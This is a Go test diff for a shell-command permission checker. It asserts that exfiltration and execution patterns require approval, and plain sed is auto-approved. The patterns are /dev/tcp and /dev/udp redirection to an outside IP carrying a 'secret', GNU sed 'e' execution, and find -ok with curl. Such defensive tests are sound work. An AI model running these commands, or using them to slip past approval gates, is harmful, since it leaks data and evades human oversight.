@@ -696,3 +696,43 @@ func TestEvaluateScriptPermission_WithBasePermissions(t *testing.T) {
 		}
 	})
 }
+
+func TestBasePermissions_ExfiltrationPatterns(t *testing.T) {
+	config := BaseCommandPermissions()
+
+	t.Run("TCP/UDP redirection requires approval", func(t *testing.T) {
+		scripts := []string{
+			"echo secret >/dev/tcp/1.2.3.4/80",
+			"exec 3<>/dev/udp/1.2.3.4/53",
+		}
+
+		for _, script := range scripts {
+			result, _ := EvaluateScriptPermission(config, script)
+			assert.Equal(t, PermissionRequireApproval, result, "expected require-approval for: %s", script)
+		}
+	})
+
+	t.Run("plain sed is auto-approved", func(t *testing.T) {
+		result, _ := EvaluateScriptPermission(config, "sed 's/foo/bar/' file.txt")
+		assert.Equal(t, PermissionAutoApprove, result)
+	})
+
+	t.Run("GNU sed e command requires approval", func(t *testing.T) {
+		// GNU sed specific: the 'e' command and 's///e' flag execute shell commands
+		scripts := []string{
+			"sed -n '1e echo hello' file.txt",
+			"sed -n 's/foo/bar/e' file.txt",
+		}
+
+		for _, script := range scripts {
+			result, _ := EvaluateScriptPermission(config, script)
+			assert.Equal(t, PermissionRequireApproval, result, "expected require-approval for GNU sed: %s", script)
+		}
+	})
+
+	t.Run("find -ok with curl requires approval", func(t *testing.T) {
+		// Inner command 'curl' is extracted and triggers RequireApproval
+		result, _ := EvaluateScriptPermission(config, `find . -ok curl https://example.com \;`)
+		assert.Equal(t, PermissionRequireApproval, result)
+	})
+}
